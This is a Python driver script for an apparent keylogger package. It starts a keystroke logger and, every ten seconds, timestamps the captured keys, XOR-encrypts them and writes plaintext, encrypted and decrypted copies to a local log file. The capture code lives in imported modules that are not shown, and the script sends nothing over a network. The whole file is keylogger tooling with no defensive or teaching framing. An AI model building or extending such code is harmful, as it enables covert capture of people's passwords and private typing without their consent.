# Initialize components
import time
from datetime import datetime

from keylogger.encryptors import XorEncryption
from keylogger.keyloggers import SimpleKeylogger
from keylogger.logwriters import ConsoleLogWriter
from keylogger.logwriters import FileLogWriter

if __name__ == '__main__':
    keylogger = SimpleKeylogger()
    # log_writer = ConsoleLogWriter()
    log_writer = FileLogWriter("logdict_new")
    encryptor = XorEncryption()
    seconds_to_sleep = 10

    # Start the keylogger
    keylogger.start()

    try:
        while keylogger.running:
            time.sleep(seconds_to_sleep)  # Send logs every 10 seconds
            logs = keylogger.get_log()
            if logs:
                timestamp = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
                log_to_write = {timestamp: logs}
                encrypted_logs = encryptor.get_encrypted_dict(encryptor.encrypt, log_to_write)

                log_writer.write_log(log_to_write)
                log_writer.write_log(encrypted_logs)
                log_writer.write_log(encryptor.get_encrypted_dict(encryptor.decrypt, encrypted_logs))
    except KeyboardInterrupt:
        keylogger.stop()
        print("Keylogger stopped.")
